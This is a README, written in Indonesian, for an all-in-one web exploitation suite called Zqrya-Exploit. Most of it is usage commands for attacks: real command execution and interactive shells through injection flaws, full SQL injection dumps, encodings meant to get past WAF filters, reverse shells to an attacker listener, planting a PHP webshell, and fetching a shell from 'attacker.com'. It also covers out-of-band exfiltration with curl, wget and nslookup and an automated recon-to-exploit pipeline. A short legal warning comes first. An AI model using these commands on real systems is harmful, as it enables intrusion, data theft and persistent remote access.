# Zqrya-Exploit — All-in-One Web Exploitation Suite

Tools desktop (Python + Tkinter) + CLI untuk menguji & mengeksploitasi berbagai
tipe kerentanan web: **command injection (RCE)**, **SQL injection (dump)**,
**XSS**, **SSTI**, **SSRF**, **LFI/RFI**, **XXE**, **open redirect**,
**CORS/CRLF**, **blind OOB**, **directory/traversal**, plus **recon**
(subdomain + crawl) dan **auto-exploit**.

## Installasi (package + launcher `zqrya`)

```bash
# dari root project
pip install .

# atau mode editable untuk pengembangan
pip install -e .
```

Setelah terpasang, tersedia launcher `zqrya` (plus `python -m zqrya_exploit`
dan `python zqrya.py` untuk source checkout):

```bash
zqrya --cli https://target.com --crawler -o report.html
zqrya --cli --tools
```

Struktur package:

```
zqrya_exploit/
  __init__.py        # versi + entry point `main`
  __main__.py        # python -m zqrya_exploit
  core.py            # seluruh engine scanner/exploiter
  tools/             # mesin vendored (zq-radar, zq-fuzzer, zq-hunter, zq-dbstrike)
  wordlist.txt       # wordlist fuzz bawaan
setup.py / pyproject.toml / MANIFEST.in   # build & bundling
```

> Catatan: GUI butuh `tkinter` (di Linux: `apt install python3-tk`). Tanpa
> tkinter, tool otomatis fallback ke mode CLI.

## Peringatan Hukum

Gunakan **hanya** pada sistem milikmu sendiri atau sistem yang sudah kamu
dapat izin tertulis untuk diuji (authorized penetration testing). Menguji
atau mengeksekusi perintah pada sistem pihak lain tanpa izin adalah tindakan
ilegal.

## Fitur

- Modal untuk memasukkan URL target (tombol **Ganti URL (Modal)**).
- **Scan Shell Injection**: injeksi payload (`;`, `|`, `$(...)`, backtick,
  bypass spasi/IFS, bypass keyword/WAF, dll.) ke tiap query parameter,
  deteksi lewat echo marker + time-based.
- **Crawl Form & Scan Injection**: otomatis mengambil halaman, mengurai
  `<form>` (GET/POST), input/textarea/select, dan link berparameter, lalu
  menjalankan uji command injection ke semua parameter yang ditemukan.
- **Scan Directory / Traversal**: cek open directory listing di path umum,
  dan uji path traversal untuk membaca file sensitif (`/etc/passwd`, dll.).
- **Scan SQL Injection**: deteksi error-based (17 tanda error DB),
  boolean-based (diferensial panjang respons), time-based
  (`SLEEP` / `WAITFOR` / `pg_sleep`), plus ekstraksi versi DB
  (extractvalue/updatexml).
- **Scan Reflected XSS**: injeksi payload `<script>`, `<img onerror>`, `<svg>`,
  dst. dengan marker acak; deteksi refleksi tanpa encode.
- **Scan LFI / file inclusion**: `../../etc/passwd`, `php://filter` (base64),
  `proc/self/environ`, `win.ini`.
- **Scan XXE**: entity eksternal -> callback OOB.
- **Scan Open Redirect**: deteksi lewat header `Location`.
- **Scan CORS & CRLF** (`--mode headers`): ACAO reflect + credentials, header injection.
- **Scan HTTP Request Smuggling** (`--mode smuggling`): deteksi desync
  framing CL.TE / TE.CL / TE.TE antara front-end (proxy/CDN) dan back-end
  via timing differential (probe CL+TE bertentangan, tiap positif dikonfirmasi
  3 koneksi berturut-turut agar minim false positive).
- **Scan File Sensitif**: `/.env`, `/.git/config`, `phpinfo.php`, `actuator`, dll.
- **Scan SSTI**: payload `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, dst.; deteksi lewat `49`.
- **Scan SSRF**: callback OOB ke listener HTTP lokal.
- **SQLi Dump / `--sqli-dump` / `--sqli-query`**: ekstraksi penuh ala zyra-sqli
  dasar — jumlah kolom (ORDER BY) → databases → tables → columns → data
  via UNION SELECT (MySQL/information_schema), plus query SQL arbitrer.
  Fallback otomatis ke **blind boolean/time-based** (binary search per char)
  bila UNION in-band gagal.
- **Update Payloads / `--update-payloads`**: unduh payload PayloadsAllTheThings
  (XSS, SQLi, SSTI, SSRF, LFI/RFI, XXE, open redirect, dll.) ke `./payloads/`.
- **Run Command (Inject) / `--exec` / `--shell`**: eksekusi command nyata
  pada parameter rentan. Output dibungkus penanda acak lalu diekstrak,
  jadi kamu dapat membaca hasilnya seperti shell.

## Sumber Payload

Payload digabung dari referensi publik (untuk kelengkapan bypass):

- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks — Command Injection](https://hacktricks.wiki/en/pentesting-web/command-injection.html)
- [PortSwigger — OS command injection](https://portswigger.net/web-security/os-command-injection)
- OWASP testing guide

Kategori payload: chaining (`;` `|` `||` `&&` `&` `\n` `\r\n` `\t`),
substitusi perintah (`$()` backtick), bypass spasi (`${IFS}` `$IFS$9`
`$@` brace expansion), bypass keyword (quote/backslash/subshell insert),
dan time-based (`sleep`, `ping`).

Payload XSS & SQLi juga diambil dari repo yang sama:

- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Cara Pakai

### Sekali Jalan (shortcut)

Pipeline lengkap — subdomain + crawl + scan semua payload (semua encoding) +
auto-inject — cukup satu flag `--crawler`, dan laporan HTML via `-o`:

```bash
python zqrya.py --cli https://target.com --crawler -o target.html
```

`--crawler` sama dengan `--mode recon --encode auto --auto-exploit`.

### GUI

```bash
pip install -r requirements.txt
python zqrya.py
```

1. Klik **Ganti URL (Modal)**, masukkan URL target, misal
   `http://target.com/index.php?cmd=id`.
2. Pilih **Scan Shell Injection** / **Scan Directory / Traversal**, atau
   **Run Command (Inject)** untuk mencari parameter rentan lalu mengeksekusi
   command berulang lewat dialog.

### CLI (tanpa display / container)

Jika dijalankan di container tanpa display, tool otomatis masuk mode CLI.
Bisa juga dipaksa dengan flag `--cli`:

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode all
# mode: injection | directory | all | sqli | ssti | ssrf | lfi | xxe
#       | redirect | headers | oob | recon
```

SQLi dump penuh + query arbitrer:

```bash
python zqrya.py --cli http://localhost/vuln.php?id=1 --sqli-dump
python zqrya.py --cli http://localhost/vuln.php?id=1 --sqli-query "select group_concat(table_name) from information_schema.tables"
```

Ambil payload dari repo:

```bash
python zqrya.py --cli --update-payloads
```

Atur kecepatan scan (thread paralel):

```bash
python zqrya.py --cli http://localhost/ --mode directory --threads 50
```

Delegasi ke tool eksternal besar (jika terpasang):

```bash
python zqrya.py --cli --tools            # daftar mesin terdeteksi
python zqrya.py --cli http://target/ --radar
python zqrya.py --cli http://target/vuln.php?id=1 --dbstrike
python zqrya.py --cli http://target/ --fuzzer --wordlist wordlist.txt
python zqrya.py --cli example.com --hunter
```

Eksekusi satu command pada parameter rentan:

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id --exec "id; uname -a"
```

Buka shell interaktif:

```bash
python zqrya.py --cli http://localhost/vuln.php --shell
python zqrya.py --cli http://localhost/vuln.php --shell --param cmd
```

Untuk directory scan dengan wordlist custom (satu path per baris):

```bash
python zqrya.py --cli http://localhost/ --mode directory --wordlist wordlist.txt
```

Di GUI, isi field **Wordlist** (atau tombol **Pilih File**) sebelum klik
**Scan Directory / Traversal**. Kosongkan (Reset) untuk pakai path default.

## Encoding Payload (bypass filter input / WAF)

Payload bisa di-encode untuk lolos filter input / WAF via `--encode` (GUI:
pilih dropdown **Encoding**):

| mode        | keterangan                                                       |
|-------------|------------------------------------------------------------------|
| `none`      | plain (default)                                                  |
| `url`       | percent-encode karakter khusus (`%3B%20...`)                     |
| `double-url`| percent-encode dua kali (`%253B%2520...`)                        |
| `hex`       | encode tiap byte termasuk huruf/angka (`%3b%20%65...`)           |
| `double-hex`| hex lalu di-url-encode lagi                                      |
| `auto`      | coba semua mode untuk tiap payload                               |

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode injection --encode double-url
python zqrya.py --cli http://localhost/vuln.php?cmd=id --encode hex --exec "id"
python zqrya.py --cli http://localhost/vuln.php?cmd=id --encode auto --mode injection
```

Selain encoding transport, mode exploit juga mencoba command yang di-hex-encode
(`printf <hex> | xxd -r -p | sh` dan `bash -c $'\x..'`) untuk bypass filter
karakter pada command itu sendiri.

## Struktur Folder

```
zqrya.py                      # shim backward-compat (python zqrya.py)
setup.py / pyproject.toml     # build & bundling package
MANIFEST.in                   # daftar file yang ikut ke wheel
zqrya_exploit/
  __init__.py                 # versi + entry point `main`
  __main__.py                 # python -m zqrya_exploit
  core.py                     # engine utama (scanner + exploiter)
  wordlist.txt                # wordlist fuzz bawaan
  tools/
    dbstrike/                 # mesin serangan database zyra-sqli (SQLi full, Python)
    bin/
      zq-dbstrike             # launcher mesin zyra-sqli (Python)
      zq-radar                # binary mesin radar — recompile dari source (deteksi massal)
      zq-fuzzer               # binary mesin fuzzer — recompile dari source (fuzz direktori)
      zq-hunter               # binary mesin hunter — recompile dari source (enumerasi subdomain)
payloads/                     # payload PayloadsAllTheThings (hasil --update-payloads)
reports/                      # laporan output
```

Tiga mesin Go (`zq-radar`, `zq-fuzzer`, `zq-hunter`) sudah **di-recompile dari
source** dengan identitas sendiri (banner, nama, config dir, version) — bukan
wrapper lagi. Mesin Python `zyra-sqli` (vendor `dbstrike`) di-launch lewat
`zq-dbstrike`. Flag `--dbstrike`, `--radar`, `--fuzzer`, `--hunter` otomatis
pakai mesin vendored bila ada, dan fallback ke implementasi native bila tidak.

## Mode Otomatis Penuh (`--auto`)

Satu command untuk semuanya — recon (subdomain + crawl) + scan semua tipe vuln
+ auto-exploit RCE + SQLi dump:

```bash
python zqrya.py --cli https://target.com --auto -o report.html
```

## Mesin Exploit Vendored (zyra-sqli / radar / fuzzer / hunter)

Empat mesin `Zqrya-Exploit` sudah terpasang lokal (bukan install global, tanpa
mengunduh ulang). Identitas mesin Go sudah di-rebrand penuh dari source
(`zq-radar` → `Radar Engine Version`, `zq-fuzzer` → `fuzzer version`,
`zq-hunter` → `Current Version` + config dir `hunter`):

```bash
python zqrya.py --cli https://target.com --hunter               # hunter: subdomain
python zqrya.py --cli https://target.com --radar                # radar: deteksi massal
python zqrya.py --cli https://target/vuln.php?id=1 --dbstrike   # zyra-sqli: SQLi dump
python zqrya.py --cli https://target.com --fuzzer --wordlist wordlist.txt  # fuzzer: fuzz dir
```

Kalau mesin vendored tidak ada, tool otomatis fallback ke implementasi native
(crt.sh + brute DNS, multi-vuln scan, UNION+blind SQLi dump, dir fuzz internal).

## Recon: subdomain → crawl → scan → auto-exploit

Pipeline otomatis: enumerasi subdomain (pasif crt.sh + opsional brute-force
DNS), crawling seluruh URL/form dalam scope, scan tiap endpoint untuk
**command injection + XSS + SQL injection**, lalu (opsional) exploit parameter
command injection yang terbukti rentan.

```bash
# recon + scan (tanpa exploit)
python zqrya.py --cli example.com --mode recon

# recon + auto-exploit (jalankan command konfirmasi di tiap param rentan)
python zqrya.py --cli example.com --mode recon --auto-exploit

# lengkap: brute subdomain + atur kedalaman/halaman + encoding
python zqrya.py --cli example.com --mode recon --auto-exploit \
    --subdomain-wordlist subdomains.txt --max-depth 4 --max-pages 300 \
    --delay 0.2 --encode none
```

Catatan:
- Scope crawl = domain utama + subdomain (link eksternal dilewati).
- `--auto-exploit` hanya menjalankan command konfirmasi aman
  (`id; uname -a; hostname`) untuk membuktikan RCE — bukan langsung drop shell.
- Enumerasi pasif via [crt.sh](https://crt.sh); brute-force DNS memakai
  wordlist `--subdomain-wordlist`.

## Blind / OOB (DNS & HTTP exfiltration)

Deteksi blind command injection tanpa output lewat callback out-of-band.

**Mode lokal (auto-detect)** — tool membuka listener HTTP + DNS sendiri dan
mencocokkan marker yang balik:

```bash
# HTTP saja (tidak butuh root)
python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode oob --oob-type http

# HTTP + DNS (DNS butuh root karena bind port 53)
python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode oob --oob-type both

# atur IP/port sendiri
python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode oob \
    --oob-host 10.0.0.5 --oob-port 8080 --oob-wait 20
```

**Mode collaborator (manual)** — arahkan callback ke Burp Collaborator /
interactsh, lalu cek marker di dashboard:

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id --mode oob \
    --oob-domain xyz123.interactsh.com
```

Payload OOB:
- **DNS**: `nslookup`, `dig`, `host` (server eksplisit), dan subdomain marker.
- **HTTP**: `curl`, `wget`, `python`, `python3`.

## Reverse Shell & Web Shell

### Reverse shell

Luncurkan reverse shell pada parameter rentan (payload: bash, nc, python,
python3, perl, php, ruby, socat, awk). Jalankan listener dulu (terminal lain):

```bash
nc -lvnp 4444
# atau
python zqrya.py --cli --listen 4444
```

Lalu luncurkan payload dari target:

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id \
    --rshell bash --lhost 192.168.1.10 --lport 4444

# tipe lain
python zqrya.py --cli http://localhost/vuln.php --rshell python3 --lhost 10.0.0.5

# daftar tipe
python zqrya.py --cli --rshell-list
```

### Web shell (upload)

Tulis PHP webshell inline langsung ke path target (menggunakan base64):

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id \
    --webshell --webshell-path /var/www/html/x.php \
    --webshell-url http://localhost/x.php
# akses: http://localhost/x.php?cmd=id
```

Atau unduh shell yang sudah kamu host di server sendiri:

```bash
python zqrya.py --cli http://localhost/vuln.php?cmd=id \
    --fetch-shell http://attacker.com/shell.php \
    --webshell-path /var/www/html/x.php
```

## Laporan Hasil Scan

**CLI** — simpan hasil ke file via `-o`/`--output` (format otomatis dari ekstensi):

```bash
python zqrya.py --cli http://localhost/ --mode all -o report.txt
python zqrya.py --cli http://localhost/ --mode all -o report.json
python zqrya.py --cli https://target.com --crawler -o report.html
```

Format: `.txt` (plain), `.json` (terstruktur), `.html`/`.htm` (laporan web dengan
tabel findings + log).

**GUI** — klik tombol **Save Report** setelah scan selesai, pilih lokasi dan
format (`.html`, `.txt` atau `.json`). GUI juga punya dropdown **Mode**
(all/injection/sqli/ssti/ssrf/xss/lfi/xxe/redirect/headers/smuggling/directory/oob/recon),
tombol **Run Scan
(Mode)**, **SQLi Dump**, **Run Command (Inject)**, dan **Encoding** — jadi
fungsinya setara dengan CLI.

> Catatan: jika `requests` tidak terpasang, tool otomatis fallback ke
> `urllib` bawaan Python.

## Testing

Test suite (stdlib `unittest`, offline — semua berjalan di server HTTP lokal):

```bash
python3 -m unittest discover -s tests -v
```

Cakupan: helper & encoding, `Report`/`ScanLogger`, helper HTTP (requests +
fallback urllib), `FormParser`/`crawl_forms`, command injection (deteksi +
exploit + time-based), SQLi (error/boolean/time, UNION dump, blind extract),
XSS/SSTI/LFI/open redirect/CORS/CRLF, dan HTTP Request Smuggling
(CL.TE/TE.CL/TE.TE).

## Status & catatan pengembangan

- Mesin SQLi vendored (`zqrya_exploit/tools/dbstrike/`) sudah di-rebrand penuh
  dari `sqlmap` → **zyra-sqli** (identitas tampilan `zyra-sqli`, identifier
  kode `zyra_sqli`/`ZYRA_SQLI`, referensi modul/engine `dbstrike`).
- Status kerja & checklist lanjutan project ada di [`update.md`](update.md).
